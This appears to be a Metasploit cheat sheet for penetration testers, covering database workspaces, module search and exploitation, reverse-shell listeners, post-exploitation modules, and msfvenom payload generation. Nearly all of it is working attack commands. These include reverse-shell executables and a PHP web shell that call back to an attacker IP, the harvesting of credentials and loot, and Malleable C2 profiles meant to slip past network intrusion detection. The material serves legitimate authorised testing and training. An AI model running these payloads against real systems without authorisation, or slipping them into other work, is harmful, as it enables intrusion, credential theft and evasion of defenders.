Metasploit

The industry standard penetration testing framework for discovering, validating, and executing exploit payloads. Encompasses over 2,400 exploit and auxiliary modules, PostgreSQL asset tracking, Meterpreter in-memory C2, pivoting, and Malleable C2 evasion.

First 3 Commands — Quick Start
The core exploitation loop: Search → Configure → Check → Run → Interact. Run each command sequentially.
1 Launch & Database
$ msfconsole -q Launch console in quiet mode
msf> db_status Verify PostgreSQL connectivity
2 Find & Configure Module
msf> search cve:2021-44228 Search target exploit by CVE
msf> use 0 Select module from search index
msf> show options Inspect required parameters (RHOSTS, LHOST)
3 Validate & Exploit
msf> check Safe vulnerability pre-flight check
msf> run Execute exploit and spawn session
msf> sessions -i 1 Interact with created Meterpreter session
Why is my exploit failing? — The check command, encoders, and session traps.
  • Always run check before run: The check command safely evaluates target banner and version signatures without transmitting exploit payloads or injecting memory. Firing blindly can trigger kernel blue screens, crash production daemons, or cause permanent denial of service.
  • Encoders (shikata_ga_nai) do NOT bypass modern AV/EDR: Encoders exist solely to eliminate bad characters (such as null bytes \x00) that break string parsing in memory. Modern endpoint protection engines analyze behavioral execution and API calls. Generating payloads with -i 20 iterations simply corrupts the binary and still triggers immediate detection.
  • Staged vs. Stageless mismatch breaks shells: If you generate a staged payload (windows/x64/meterpreter/reverse_tcp), you must catch it with exploit/multi/handler. If caught with a plain Netcat listener, you only receive garbage bytes because Netcat cannot transmit the second stage. Use a stageless payload (windows/x64/meterpreter_reverse_tcp) if catching with Netcat.
A database is not optional. Metasploit's PostgreSQL database records discovered IP addresses, open ports, services, extracted credentials, and loot. Without it, you are manually tracking recon in text files. Always run sudo systemctl start postgresql && msfdb init before launching msfconsole. Use Workspaces (workspace -a ClientName) to keep customer engagements isolated. Import external Nmap scans directly with db_import scan.xml to populate your target list automatically.

Database & Workspaces

Database initialization and verification
Start PostgreSQL, initialize the msfdb backend, and verify active connectivity.
$ sudo systemctl start postgresql && msfdb init
msf> db_status Expected: Connected to msf. Connection type: postgresql
Workspaces — Multi-engagement isolation
Prevent target cross-contamination between clients or testing environments.
msf> workspace -a ClientAlpha Create and switch to new workspace
msf> workspace List all existing workspaces
msf> workspace ClientAlpha Switch active workspace context
Importing reconnaissance & scanning in-console
Ingest XML scan files from Nmap or launch scans directly through the database wrapper.
msf> db_import nmap_scan.xml Import Nmap XML directly into current workspace
msf> db_nmap -sV -sC -O 10.10.10.1 Execute Nmap and automatically ingest targets
Integration Tip: Pair with Nmap's -oX XML output. See the Nmap page CHAIN cells for bidirectional workflow chaining.
Querying database assets
Filter hosts, services, captured credentials, and loot stored in the database.
msf> hosts -c address,os_name,purpose List discovered hosts and operating systems
msf> services -p 445,80,443 -u List open ports and running service versions
msf> creds View harvested passwords and NTLM hashes
msf> loot Display exfiltrated configuration files & tokens
Automation & Engagement Logging — Resource scripts & spool
Record every command you run for later replay or engagement evidence.
msf> makerc /tmp/eng.rc Save command history as a replayable resource script
msf> resource /tmp/eng.rc Execute automated commands from resource script
msf> spool /tmp/eng.log Log all console output to engagement evidence file
msf> spool off Disable active console logging

Search & Module Selection

Advanced module search filtering
Filter across 2,400+ modules by type, platform, CVE year, and exploit reliability rank.
msf> search type:exploit platform:windows cve:2021 rank:excellent
msf> search cve:2021-44228 type:exploit Search Log4Shell CVE
msf> search path:scada type:auxiliary Filter modules by tree path
Module selection, inspection, and options validation
Activate modules by index number, inspect requirements, and isolate unconfigured variables.
msf> use 0 Select first module from search results index
msf> info Read disclosure description, authors, and side-effects
msf> show options Display all required and optional module variables
msf> show missing Show only the required fields that still need values
Global variables (setg / unsetg)
Persist attacking interface IP and default target across all modules in your console session.
msf> setg LHOST 10.10.14.5 Set attacking IP once for entire session
msf> setg RHOSTS 10.10.10.1 Set global target IP
msf> unsetg RHOSTS Unset global variable
Auxiliary Modules — Scanners & service enumeration
Auxiliary modules are scanners and fuzzers — no payload, no session, just information.
msf> use auxiliary/scanner/smb/smb_version Load SMB service version scanner
msf> set RHOSTS 10.10.10.0/24 Scan entire target subnet
msf> set THREADS 16 Accelerate scan concurrency
msf> run Execute scan & populate services database

Payloads & Listeners

multi/handler with persistent listener (ExitOnSession false)
Catch inbound reverse payloads in background jobs without closing after the first shell.
msf> use exploit/multi/handler
msf> set payload windows/x64/meterpreter/reverse_tcp
msf> set LHOST 10.10.14.5 && set LPORT 4444
msf> set ExitOnSession false Crucial: Listener stays open for multiple incoming shells
msf> exploit -j -z Run listener as background job (-j) without auto-interacting (-z)
Staged vs. Stageless Payloads (The Slash vs. Underscore Rule)
Understand the operational mechanics that govern payload delivery, memory footprint, and listener compatibility.
TypeNaming SyntaxExecution MechanismListener Requirement
Staged meterpreter/reverse_tcp (has slash) Small ~300 byte stager executes first, opens socket, and pulls large reflective DLL stage into memory Requires multi/handler (Netcat cannot send stage 2)
Stageless meterpreter_reverse_tcp (underscore) Monolithic binary containing all Meterpreter logic embedded in payload; executes self-contained Can be caught with Netcat (nc -lvnp 4444) or multi/handler
Non-Meterpreter payloads (cmd & /bin/sh)
Raw command shells without reflective DLL injection; lighter memory footprint and lower EDR detection rate.
msf> set payload windows/x64/shell/reverse_tcp Direct Windows cmd.exe reverse shell
msf> set payload linux/x64/shell_reverse_tcp Direct Linux POSIX /bin/sh stageless shell

Automated Post-Exploitation Modules
Run reconnaissance, privilege escalation suggestions, and upgrade raw shells.
msf> use post/multi/recon/local_exploit_suggester
msf> set SESSION 1 && run Analyze architecture and recommend local privilege escalation exploits
msf> use post/multi/manage/shell_to_meterpreter
msf> set SESSION 1 && run Upgrade a raw shell session into full Meterpreter

msfvenom & Modern Evasion

Standard Cross-Platform Payloads (Stageless & Encrypted)
Generate self-contained reverse HTTPS executables, Linux binaries, and PHP web shells.
$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o shell.exe
$ msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
Modern Evasion — Malleable C2 HTTP Profiles (Metasploit 6.5+)
Shape Meterpreter network traffic to mirror legitimate web applications (e.g. Amazon, jQuery, Cloudflare).
$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.14.5 LPORT=443 MALLEABLEC2=/opt/profiles/amazon.profile -f exe -o shell.exe
Evasion Architecture: Malleable C2 transforms URI patterns, HTTP headers, and body telemetry to blend into normal corporate outbound HTTPS browsing, bypassing network-based IDS/IPS inspection.
Discovering payloads and output formats
Filter available architecture payloads and output formats directly via the msfvenom CLI.
$ msfvenom --list payloads | grep windows/x64
$ msfvenom --list formats
